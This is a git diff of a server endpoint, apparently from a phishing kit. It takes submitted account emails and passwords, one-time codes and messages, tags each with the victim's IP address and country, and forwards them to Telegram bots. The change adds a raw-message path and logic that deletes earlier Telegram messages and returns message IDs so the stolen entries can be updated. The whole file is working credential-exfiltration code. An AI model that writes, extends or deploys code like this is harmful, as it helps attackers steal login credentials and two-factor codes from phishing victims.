@@ -3,8 +3,8 @@ import { countryAlpha2CodeMapIcon } from '../utils/country'
 export default defineEventHandler(async (event) => {
   // event.context.path to get the route path: '/api/foo/bar/baz'
   // event.context.params._ to get the route segment: 'bar/baz'
-  const { account, code, message, newUser } = await readBody(event)
-  if (!account && !code && !message && !newUser) {
+  const { account, code, message, newUser, rawMessage, conversation } = await readBody(event)
+  if (!account && !code && !message && !newUser && !rawMessage) {
     throw createError({
       statusCode: 400,
       statusMessage: 'Bad Request',
@@ -42,31 +42,50 @@ export default defineEventHandler(async (event) => {
 
     if (code) {
       messageText = `
-<b>📲 Code : </b><code>${code}</code>
-----------------
 <b>🛰 Địa chỉ ip: </b>${event.headers.get('CF-Connecting-IP')}
 <b>🌐 Quốc gia: </b>${countryCode} ${countryIcon}
+
+<b>📲 Code : </b><code>${code}</code>
 `
     } else if (account) {
       messageText = `
+<b>🛰 ip: </b>${event.headers.get('CF-Connecting-IP')}
+<b>🌐 Quốc gia: </b>${countryCode} ${countryIcon}
+
 <b>🔑 Tài khoản: </b><code>${account.email}</code>
 <b>🔐 Mật khẩu: </b><code>${account.password}</code>
-----------------
-<b>🛰 ip: </b>${event.headers.get('CF-Connecting-IP')}
-<b>🌐 Quốc gia: </b>${countryCode} ${countryIcon}
 `
-    } else {
+    } else if (message) {
       messageText = `
-<b>${message}</b>
-----------------
 <b>🛰 ip: </b>${event.headers.get('CF-Connecting-IP')}
 <b>🌐 Quốc gia: </b>${countryCode} ${countryIcon}
+
+<b>${message}</b>
 `
+    } else if (rawMessage) {
+      messageText = rawMessage
     }
 
+    const resultChat = []
     for (let i = 0; i < tokens.length; i++) {
       if (!tokens[i] || !chatIds[i]) {
         continue
+      }
+
+      // find chatid in conversation
+      if (conversation && conversation.length > 0) {
+        const chatId = conversation.find((c) => c.cid === chatIds[i])?.mid
+        try {
+          await $fetch(`https://api.telegram.org/bot${tokens[i]}/deleteMessage`, {
+            method: 'POST',
+            body: {
+              chat_id: chatIds[i],
+              message_id: chatId,
+            },
+          })
+        } catch (error) {
+          console.error(error)
+        }
       }
       try {
         console.log('sending to', chatIds[i], tokens[i])
@@ -86,7 +105,7 @@ export default defineEventHandler(async (event) => {
 <b>🌐 Domain: </b>${host}
 `
         }
-        await $fetch(`https://api.telegram.org/bot${tokens[i]}/sendMessage`, {
+        const { result } = await $fetch(`https://api.telegram.org/bot${tokens[i]}/sendMessage`, {
           method: 'POST',
           body: {
             chat_id: chatIds[i],
@@ -94,11 +113,15 @@ export default defineEventHandler(async (event) => {
             parse_mode: 'HTML',
           },
         })
+        resultChat.push({
+          cid: chatIds[i],
+          mid: result.message_id,
+        })
       } catch (error) {
         console.error(error)
       }
     }
-    return 'ok'
+    return resultChat
   } catch (error) {
     // eslint-disable-next-line no-console
     console.error(error)
